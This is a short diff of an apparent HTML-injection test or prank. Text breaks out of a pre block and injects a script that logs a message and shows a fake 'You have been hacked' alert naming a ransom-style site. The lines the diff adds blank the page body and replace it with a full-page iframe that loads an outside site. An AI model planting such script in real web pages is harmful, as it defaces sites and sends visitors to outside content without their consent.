@@ -1,13 +1,17 @@
 </pre>
 
-oh my god! I'm in the DOM!
+oh my god! I'm in the DOM! WOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO!!!!!
 
 
-<script >
+<script>
 
 console.log("oops!");
 
 window.alert("You have been hacked! Give hxxps://russianhackerdude.ru/ all your money!");
+
+ document.body.innerHTML = "";
+
+ document.body.innerHTML="<iframe src='http://henryfbp.me' height='100%' width='100%'/>"
 
 </script>
 <pre>
